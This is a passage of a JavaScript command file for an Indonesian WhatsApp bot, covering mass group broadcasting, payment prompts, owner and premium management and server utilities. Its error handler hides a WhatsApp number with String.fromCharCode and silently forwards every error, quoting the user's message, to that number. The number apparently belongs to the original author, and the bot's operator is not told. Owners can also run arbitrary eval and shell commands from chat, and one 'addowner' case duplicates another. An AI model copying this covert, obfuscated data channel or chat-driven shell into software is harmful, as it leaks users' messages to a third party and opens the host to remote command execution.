await Sky.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Akses(mess.owner)
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
const url1 = `${global.image.qris}`;
async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: Sky.waUploadToServer
 });
 return imageMessage;
}
let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `\`Pilih metode pembayaran berikut\`` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: `*\`Nomor Pembayaran\`*
*──────────────*

❏ *Dana* : ${global.dana}
❏ *Gopay* : ${global.gopay}
❏ *Ovo* : ${global.ovo}
❏ *Qris* : *Scan Di Atas*

*[  !  ]  Penting ››*
_*Wajib Kirim Bukti Pembayaran*_
` },
 nativeFlowMessage: {
 buttons: [{                  
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Dana.\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
},
{                  
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Coppy Gopay.\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
},
{                  
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Coppy Ovo.\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
},
 ],
 },
 },

 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await Sky.relayMessage(m.chat, msg.message, {
 messageId: msg.key.id,
})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA SKYZOPEDIA*

* *Nomor :* 085624297893
* *Atas Nama :* M** H****

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//================================================================================

case "donasi": case "donate": {
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
await Sky.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*\`QRIS DONASI\`*\n_Terimakasih yang sudah donasi, berapa saja uang yang kamu berikan saya berterimakasih banyak_"}, {quoted: qtext2})
await sleep(500)
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Akses(mess.owner)
if (!q) return m.reply(example("logo"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}`
await Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": case "d": {
if (!isCreator) return Akses(mess.owner)
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
if (!text) return m.reply(example(`barang,harga\n\n*Contoh :* ${prefix}done Panel Unlimited,9000`))
if (!text.split(",")) return m.reply(example(`barang,harga\n\n*Contoh :* ${prefix}done Panel Unlimited,9000`))
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000`
var total2 = Number(`${harga}`)
const teks = `╭───── ─────╮
│ *Transaksi Done* │
╰───── ─────╯
 \`\`\`📦 ${capital(barang)}\`\`\`
 \`\`\`📅 ${getTime().split("T")[0]}\`\`\`
 \`\`\`💸 Rp${await toIDR(total2)}\`\`\`
 \`\`\`📈 Selesai ✓\`\`\`

> _Uang yang sudah saya terima tidak bisa di kembalikan lagi alias no reff_`
Sky.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break


//================================================================================

case "developerbot": case "owner": {
await Sky.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Sky.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Sky.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
Sky.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Akses(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Sky.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsckats": {
if (!isCreator) return Akses(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await loading ()
await m.reply("Mengompres file script bot")
var name = `AndikaVvip0.1`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Sky.sendMessage(m.chat, {document: await fs.readFileSync(`./${name}.zip`), fileName: `AndikaVvip - 0.1.zip`, mimetype: "application/zip", caption: "*\`Jangan Di Sebar Ya Ganteng\`*"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Akses(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Akses(mess.owner)
if (/image/g.test(mime)) {
var medis = await Sky.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Sky.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Sky.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Akses(mess.owner)
Sky.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Sky.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Akses(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Akses(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

case "delpremium": case "delprem": {
if (!isCreator) return Akses(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Akses(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Sky.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});